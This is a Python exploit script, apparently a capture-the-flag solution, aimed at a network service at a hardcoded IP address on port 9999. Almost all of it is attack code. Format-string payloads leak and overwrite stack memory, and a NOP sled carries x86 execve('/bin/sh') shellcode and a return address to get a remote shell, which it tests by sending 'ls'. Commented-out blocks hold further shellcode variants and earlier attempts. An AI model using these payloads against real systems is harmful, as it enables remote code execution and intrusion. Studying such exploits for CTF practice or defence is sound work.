import socket
import struct
import re
import time

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
sc.connect(('23.239.23.84', 9999))

def W(x):
  sc.send(x)

def R():
  return sc.recv(4096)

def PI(x):
  return struct.pack('I', x)

def UI(s):
  return struct.unpack('I', s)[0]

def grab(i):

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(('23.239.23.84', 9999))

  s.send('%'+str(i)+'$lx\n')
  
  data = s.recv(64)
  addr = data.split()[0]

  print i, addr
  s.close()
def loopedInput(x):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(('23.239.23.84', 9999))
  s.send(x + '\n')
  data = s.recv(64)
  print data
  s.send("ls\n")
  data = s.recv(64)
  print data
  s.close()
  
def changeStack(x):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(('23.239.23.84', 9999))
  s.send("%" + str(x) + "$lx" + '\n')
  data = s.recv(64)
  print data
  s.close()

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(('23.239.23.84', 9999))
  s.send("%" + str(x) + "$s" + '\n')
  data = s.recv(64)
  print data
  s.close()

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(('23.239.23.84', 9999))
  s.send("%"+ str(x) + "$s" + '\n')
  data = s.recv(64)
  print data
  s.close()

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(('23.239.23.84', 9999))
  s.send("%66c%"+ str(x) + "$hhn" + '\n')
  data = s.recv(64)
  print data
  s.close()
  
def memAddr(x):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(('23.239.23.84', 9999))
  s.send("%" + str(x) + "$lx" + '\n')
  data = s.recv(64)
  print data
  s.close()

def getData(x):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(('23.239.23.84', 9999))
  s.send("%" + str(x) + "$s" + '\n')
  data = s.recv(64)
  print data
  s.close()

def setData(x):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(('23.239.23.84', 9999))
  s.send("%60c%" + str(x) + "$n" + '\n')
  data = s.recv(64)
  print data
  s.close()
'''
W("\x57\x57\x6a\x21\x58\x31\xf6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\xeb\x0f\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00" + "\n")
print(R())

for i in range(187):
  #myInput = raw_input()
  #changeStack(myInput)
  print "~~~~~~~~~~~~~~~~" + str(i) + "~~~~~~~~~~~~~~~~"
  memAddr(i)
  getData(i)
  setData(i)
  getData(i)
  changeStack(i)

#Get Address on the stack
#for z in range(187):
 # grab(z)
'''
'''     #"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
W("aa" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" +
  "A" * i +
  "\x25\x2d\x78\x25" +
  "\n")

print(R())
'''


print(UI(PI(0x002c307d - 0x00000001)))
print(PI(0x00000001))





#2c307d-1-80482dd-7825882d-2d78252d-252d7825-78252d78-2d78252d

for i in range(20):
  
  loopedInput("\x90" * i  + #nop sled
              "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" +#shellcode
              "\x96\x59\x89\x02" #return Address
              + "\n")












'''
while True:
  myInput = raw_input()
  loopedInput(myInput)
'''











'''
for i in range(187):
  #myInput = raw_input()
  #changeStack(myInput)
  print "~~~~~~~~~~~~~~~~" + str(i) + "~~~~~~~~~~~~~~~~"
  memAddr(i)
  getData(i)
  setData(i)
  getData(i)
  changeStack(i)
#Get Address on the stack
for z in range(187):
  grab(z)
'''
#execve(/bin/bash)   \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
#ffffdf42
#SHELL=/bin/sh in mem pos 63 on stack
